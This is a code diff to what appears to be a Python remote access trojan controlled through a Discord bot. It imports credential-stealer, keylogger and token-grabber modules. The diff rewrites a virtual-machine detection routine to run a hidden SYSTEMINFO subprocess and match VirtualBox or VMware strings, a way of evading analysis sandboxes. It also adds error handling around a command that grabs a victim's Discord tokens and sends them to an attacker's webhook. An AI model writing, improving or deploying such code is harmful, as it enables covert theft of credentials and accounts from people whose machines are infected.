@@ -15,6 +15,7 @@ from multiprocessing import Process
 import threading
 import json
 import ctypes
+import re
 from libraries import credentials,keylogger,tokengrabber
 
 KEYLOG = {KEYLOG}
@@ -31,13 +32,16 @@ CREDENTIALS_ID = {CREDENTIALS_ID}
 client = commands.Bot(command_prefix="!", intents=discord.Intents.all(), help_command=None)
 
 def isVM():
-    try:
-        if hasattr(sys, 'real_prefix'):
+    rules = ['Virtualbox', 'vmbox', 'vmware']
+    command = sp.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=sp.PIPE,
+                                stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
+                                creationflags=0x08000000)
+    out, err = command.communicate()
+    command.wait()
+    for rule in rules:
+        if re.search(rule, out, re.IGNORECASE):
             return True
-        else:
-            return False
-    except Exception as e:
-        print(e)
+    return False
 
 def isAdmin():
     try:
@@ -226,9 +230,13 @@ async def token(context):
     command = context.message.content.replace("!token ", "")
     word_list = command.split()
     if int(word_list[0]) == int(ID):
-            tokengrabber.main(TOKEN_WEBHOOK)
-            my_embed = discord.Embed(title=f"Command executed succesfully on Agent#{ID}", color=0x00FF00)
-            await context.message.channel.send(embed=my_embed)
+            try:
+                tokengrabber.main(WEBHOOK_URL=TOKEN_WEBHOOK)
+                my_embed = discord.Embed(title=f"Command executed succesfully on Agent#{ID}", color=0x00FF00)
+                await context.message.channel.send(embed=my_embed)
+            except Exception as e:
+                my_embed = discord.Embed(title=f"Error while getting Token from Agent#{ID}:\n{e}", color=0xFF0000)
+                await context.message.channel.send(embed=my_embed)
     else:
         pass
 
